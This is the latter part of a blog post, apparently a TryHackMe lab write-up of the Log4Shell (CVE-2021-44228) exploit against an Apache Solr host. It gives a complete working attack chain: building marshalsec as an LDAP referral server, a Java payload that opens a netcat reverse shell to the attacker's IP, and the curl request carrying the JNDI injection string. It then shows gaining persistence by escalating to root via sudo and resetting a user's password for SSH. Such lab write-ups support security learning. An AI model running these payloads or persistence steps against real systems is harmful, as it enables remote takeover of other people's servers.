+<p>We will utilize a open-source and public utility to stage an &ldquo;LDAP Referral Server&rdquo;. This will be used to essentially redirect the initial request of the victim to another location, where you can host a secondary payload that will ultimately run the code on the target.</p>
+<ol>
+<li>
+<p><code>${jndi:ldap://attackerserver:1389/Resource}</code> -&gt; reaches out to our LDAP Referral Server</p>
+</li>
+<li>
+<p>LDAP Referral Server springboards the request to a secondary address (<em>This is a web server that we will configure to host the malicious java exploition.</em>) <code>http://attackerserver/resource</code></p>
+</li>
+<li>
+<p>The victim retrieves and executes the code present in <code>http://attackerserver/resource</code></p>
+</li>
+</ol>
+<p>We will use the <code>marshalsec</code> utility offered at <a href="https://github.com/mbechler/marshalsec">Github</a></p>
+<ul>
+<li>If you do not yet have git, you can install it through your package manager</li>
+</ul>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">sudo apt install git
+</code></pre></div><ul>
+<li>Clone the repository</li>
+</ul>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">git clone https://github.com/mbechler/marshalsec
+
+<span class="nb">cd</span> marshalsec
+</code></pre></div><ul>
+<li>If you do not yet have maven on your system, you can install it through your package manager</li>
+</ul>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">sudo apt install maven
+</code></pre></div><ul>
+<li>Command to build the marshalsec tool with maven</li>
+</ul>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">mvn clean package -DskipTests
+</code></pre></div><p><img src="/img/blog/LOG/log3.png" alt="img"></p>
+<p>With this utility built, we can start an LDAP referral server to direct connections to our secondary HTTP server.</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="s2">&#34;http://YOUR.IP.ADDRESS:8080/#Exploit&#34;</span>
+</code></pre></div><p><img src="/img/blog/LOG/log4_1.png" alt="img"></p>
+<ol>
+<li>Question</li>
+</ol>
+<p>What is the output of running this command? (You should leave this terminal window open as it will be actively awaiting connections)</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">Listening on 0.0.0.0:1389
+</code></pre></div><p>Set up a payload <code>Exploit.java</code></p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Exploit</span> <span class="o">{</span>
+    <span class="kd">static</span> <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">&#34;nc -e /bin/bash YOUR.IP.ADDRESS 9999&#34;</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div><p>Compile your payload with <code>javac Exploit.java -source 8 -target 8</code></p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~/log4j<span class="o">]</span>
+└─# javac Exploit.java -source <span class="m">8</span> -target <span class="m">8</span>
+Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings<span class="o">=</span>on -Dswing.aatext<span class="o">=</span><span class="nb">true</span>
+
+┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~/log4j<span class="o">]</span>
+└─# ls
+Exploit.class  Exploit.java  marshalsec  solrlogs  solrlogs.zip
+</code></pre></div><p>Once your payload is created and compiled, you can host it by spinning up a temporary HTTP server.</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~/log4j<span class="o">]</span>
+└─# python -m SimpleHTTPServer <span class="m">8080</span>
+Serving HTTP on 0.0.0.0 port <span class="m">8080</span> ...
+</code></pre></div><p><strong>Note that HTTP server port number (8080 in this case) is referring to our LDAP referral server argument (8080).</strong></p>
+<p>At this point, our payload is created and complied, it is hosted by an HTTP server, our LDAP server is up and waiting. Now we need a Netcat listener to catch our reverse shell.</p>
+<p><img src="/img/blog/LOG/log5.png" alt="img"></p>
+<p>Finally, all that is left to do is trigger the exploit and fire off our JNDI syntax !</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">curl <span class="s1">&#39;http://10.10.61.83:8983/solr/admin/cores?foo=$\{jndi:ldap://YOUR.IP.ADDRESS:1389/Exploit\}&#39;</span>
+</code></pre></div><p><strong>Note that changes in port number (now referring to our LDAP server).</strong></p>
+<blockquote>
+<p>After executing the above command</p>
+</blockquote>
+<p><img src="/img/blog/LOG/log6.png" alt="img"></p>
+<blockquote>
+<p>You have now received initial access and command-and-control on a vanilla, freshly installed Apache Solr instance.</p>
+</blockquote>
+<p><img src="/img/blog/LOG/log7.png" alt="img"></p>
+<p>We need to stabilize the shell</p>
+<ul>
+<li><code>python3 -c &quot;import pty; pty.spawn('/bin/bash')&quot;</code></li>
+<li><code>stty raw -echo</code></li>
+<li><code>export TERM=xterm</code></li>
+</ul>
+<hr>
+<h2 id="persistence">Persistence<a href="#persistence" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+<p>Now we have gained a reverse shell connection on the victim machine.</p>
+<ol>
+<li>Question</li>
+</ol>
+<p>Check to see what user account you are running as within the context of your reverse shell.</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">solr@solar:/opt/solr/server$ whoami
+solr
+</code></pre></div><p>If you would like to grant yourself persistence and access into the machine via SSH, then momentarily become the root and change the password for the solr user to one of your choice. This way, you can SSH as per needed!</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">solr@solar:/opt/solr/server$ sudo -l
+Matching Defaults entries <span class="k">for</span> solr on solar:
+    env_reset, <span class="nv">exempt_group</span><span class="o">=</span>sudo, mail_badpass,
+    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User solr may run the following commands on solar:
+    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: ALL
+solr@solar:/opt/solr/server$ sudo bash
+root@solar:/opt/solr-8.11.0/server# passwd solr
+Enter new UNIX password: ritesh
+
+Retype new UNIX password: ritesh
+
+passwd: password updated successfully
+root@solar:/opt/solr-8.11.0/server#
+</code></pre></div><p>And we successfully logged in via <code>SSH</code></p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">┌──<span class="o">(</span>root💀kali<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+└─# ssh solr@10.10.61.83
+solr@10.10.61.83<span class="err">&#39;</span>s password:
+Welcome to Ubuntu 18.04.3 LTS <span class="o">(</span>GNU/Linux 4.15.0-58-generic x86_64<span class="o">)</span>
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Thu Dec <span class="m">23</span> 11:57:59 UTC <span class="m">2021</span>
+
+  System load:  0.01              Processes:           <span class="m">107</span>
+  Usage of /:   4.1% of 61.80GB   Users logged in:     <span class="m">0</span>
+  Memory usage: 83%               IP address <span class="k">for</span> eth0: 10.10.61.83
+  Swap usage:   0%
+
+
+<span class="m">246</span> packages can be updated.
+<span class="m">189</span> updates are security updates.
+
+
+Last login: Thu Dec <span class="m">23</span> 11:55:07 <span class="m">2021</span> from 10.6.29.240
+solr@solar:~$
+</code></pre></div><p><strong>Finally, an attacker can realistically do anything on the victim&rsquo;s machine - whether it can be privilege escalation, exfiltration, install persistence, perform a lateral movement, or any other post-exploitation even potentially dropping cryptocurrency miners, remote access trojans, beacons, and implants or even deploying ransomware.</strong></p>
+<p><em>This is the exact reason why the internet was on fire during the weekend of December 9th, 2021.</em></p>
+
+			</div>
+			<hr class="post-end">
+			<footer class="post-info">
+				<p>
+					<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="https://riteshpuvvada.github.io/tags/log4shell">Log4Shell</a></span><span class="tag"><a href="https://riteshpuvvada.github.io/tags/ldap">LDAP</a></span><span class="tag"><a href="https://riteshpuvvada.github.io/tags/jndi">JNDI</a></span><span class="tag"><a href="https://riteshpuvvada.github.io/tags/apache-log4j-exploit">Apache Log4j exploit</a></span><span class="tag"><a href="https://riteshpuvvada.github.io/tags/cve-2021-44228">CVE-2021-44228</a></span><span class="tag"><a href="https://riteshpuvvada.github.io/tags/0-day-vulnerability">0-day vulnerability</a></span><span class="tag"><a href="https://riteshpuvvada.github.io/tags/rce">RCE</a></span><span class="tag"><a href="https://riteshpuvvada.github.io/tags/poc">PoC</a></span><span class="tag"><a href="https://riteshpuvvada.github.io/tags/thm">THM</a></span><span class="tag"><a href="https://riteshpuvvada.github.io/tags/writeup">Writeup</a></span><span class="tag"><a href="https://riteshpuvvada.github.io/tags/riteshpuvvada">RiteshPuvvada</a></span>
+				</p>
+				<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>1952 Words</p>
+				<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2021-12-19 15:30 &#43;0530</p>
+			</footer>
+		</article>
+		<div class="post-nav thin">
+			<a class="prev-post" href="https://riteshpuvvada.github.io/posts/ssti/">
+				<span class="post-nav-label">Older&nbsp;<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-right"><line x1="5" y1="12" x2="19" y2="12"></line><polyline points="12 5 19 12 12 19"></polyline></svg></span><br><span>Server-Side Template Injection</span>
+			</a>
+		</div>
+		<div id="comments" class="thin">
+</div>
+	</main>
+
+	<footer id="site-footer" class="section-inner thin animated fadeIn faster">
+		<p>&copy; 2021 <a href="https://riteshpuvvada.github.io/">Ritesh Puvvada</a> &#183; <a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></p>
+		<p>
+			Made with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> &#183; Theme <a href="https://github.com/Track3/hermit" target="_blank" rel="noopener">Hermit</a> &#183; <a href="https://riteshpuvvada.github.io/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a>
+		</p>
+	</footer>
+
+
+
+	<script src="https://riteshpuvvada.github.io/js/bundle.min.7d8545daa55d62427355498dd8da13f98ff79a7938ce7d2a5e2ae1ec0de3beb8.js" integrity="sha256-fYVF2qVdYkJzVUmN2NoT+Y/3mnk4zn0qXirh7A3jvrg=" crossorigin="anonymous"></script>
+	
+
+</body>
+
+</html>
